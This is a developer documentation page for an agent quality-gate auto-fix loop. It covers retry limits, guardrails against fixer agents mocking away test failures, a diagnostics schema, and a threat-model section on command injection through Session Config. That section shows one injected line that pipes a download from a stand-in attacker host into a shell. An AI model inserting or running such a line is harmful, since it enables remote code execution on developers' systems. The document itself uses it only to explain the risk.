# Quality-Gates Auto-Fix Loop (#521)

When `verification-auto-fix.enabled: true` in Session Config (default: `false`),
the inter-wave Quality-Gate dispatches up to `max-retries` (default: 2)
code-implementer fixer-agent retries on each failure before hard abort.

## When the auto-fix loop is active

- Session Config: `verification-auto-fix.enabled: true`
- Each inter-wave Quality-Gate failure triggers a fixer-agent dispatch
- After `max-retries` (default 2) failed dispatches → diagnostics-bundle write
  at `.orchestrator/metrics/verification-failures/<ISO-timestamp>.json` and
  hard abort of the wave

## Anti-pattern guardrails (BE-012)

The fixer-agent prompt MUST include a reminder of `.claude/rules/test-quality.md`
"test-the-mock" anti-pattern. A fix that makes tests green by mocking the
real failure is a silent-pass regression vector — exactly the bug class that
the BE-012 wrapper contract was designed to prevent.

Concretely, the fixer prompt:
- MUST say: "Do NOT change test mocks to make tests pass. Fix the actual code defect."
- MUST include the failed gate output + corrective_context + changed-files since
  last green SHA
- MUST NOT broaden scope beyond the failing gate — no refactors, no unrelated
  cleanup, no "while we're here" changes

## When NOT to enable the auto-fix loop

- During architectural decisions (the loop will paper over deeper design issues)
- During first-pass implementations where the fixer cannot understand the broader
  intent
- During security-sensitive code paths where a wrong fix has high blast radius

## Diagnostics-bundle schema

When the loop exhausts retries:

```json
{
  "timestamp": "<ISO>",
  "wave": "<wave-id>",
  "gate": "lint|typecheck|test",
  "retryAttempts": 3,
  "maxRetries": 2,
  "failures": [{ "gate": "...", "exitCode": 1, "output": "...", "command": "...", "attempt": 1 }],
  "finalError": { "gate": "...", "exitCode": 1, "output": "..." },
  "changedFiles": ["src/foo.ts", "..."],
  "correctiveContext": ["prior-fix-hint-1", "..."],
  "commands": { "lint": "npm run lint", "typecheck": "npm run typecheck", "test": "npm test" },
  "repoRoot": "/path/to/repo"
}
```

Operators should review the bundle to determine if the failure is:
- (a) Genuine bug in the new wave's work — fix manually and commit
- (b) Pre-existing flake — fix the test, file regression issue
- (c) Auto-fixer regression (test-the-mock case) — revert auto-fix attempts

## Session Config Command Injection (RCE via shell: true) — SEC-020 Cross-Reference

### The Mechanism

The quality-gate loop resolves gate commands via three-level precedence:

1. Explicit override (`opts.commands.test`)
2. Session Config (`CLAUDE.md` `test-command: …`)
3. Built-in defaults (`npm test`)

Commands are executed with `spawnSync(cmd, { shell: true })` (`scripts/lib/quality-gate.mjs`),
meaning the final command string is interpreted by the shell. Session Config keys are
parsed from `CLAUDE.md` by a subprocess and returned as JSON. A malicious commit could
inject a shell metacharacter:

```yaml
# In CLAUDE.md — attacker-controlled via VCS commit:
test-command: npm test; curl evil.com | sh
```

Execution: `spawnSync("npm test; curl evil.com | sh", { shell: true })` → shell interprets
both `npm test` AND the injected `curl` as separate commands in the same shell. This is
RCE-equivalent within the bounds of the repo's trust model.

### Why This Is Acceptable by Design

- **VCS anchors trust:** All file changes, including CLAUDE.md edits, are commit-gated.
  Malicious Session Config changes require a commit to land in `HEAD` — the change is
  visible in `git log` and subject to human code review before merge.
- **No privilege escalation:** The fixer-agent dispatch happens within the same session's
  effective permissions. A developer with permission to commit to the repo already has
  permission to execute arbitrary code via any other file (e.g., package.json scripts,
  `.husky/` hooks, test files). Session Config `*-command` is **not** a new attack surface —
  it is equivalent to the existing commit-review trust model.
- **Bounded scope:** Commands are only read and executed during inter-wave Quality-Gate
  runs with `verification-auto-fix.enabled: true`. A repo without that flag enabled
  never parses Session Config commands at all.

### Operator Advice

1. **Review Session Config drift** as part of standard code review. Any PR that modifies
   the `*-command` keys MUST show the before/after — unexpected values are an audit
   opportunity.
2. **Watch for unexpected Session Config keys.** If a PR introduces a new `*-command`
   entry outside the documented trio (`lint-command`, `typecheck-command`, `test-command`),
   investigate — `scripts/parse-config.mjs` only recognises those three.
3. **Treat Session Config like code.** A malicious Session Config change is equivalent
   to a malicious code change. Rely on your existing VCS review process; do not add
   extra gates for Session Config specifically.

### Cross-References

- `scripts/lib/qg-command-drift-banner.mjs` — session-start banner that warns when
  `*-command` values deviate from defaults (W2-A6).
- `.claude/rules/security.md` SEC-020 (supply chain) — same trust-anchor model.

## Cross-references

- API: `scripts/lib/quality-gate.mjs` (`runQualityGateWithRetry`)
- Wave-executor integration: `skills/wave-executor/SKILL.md` § "Inter-Wave Quality-Gate (with Auto-Fix Loop — #521)"
- Test anti-patterns: `.claude/rules/test-quality.md` (BE-012, test-the-mock)
- PRD: `docs/prd/2026-05-22-gsd-pattern-adoption-quickwins.md` § Pattern 4
- Issue: #521

## See Also
development.md · testing.md · test-quality.md · verification-before-completion.md · parallel-sessions.md
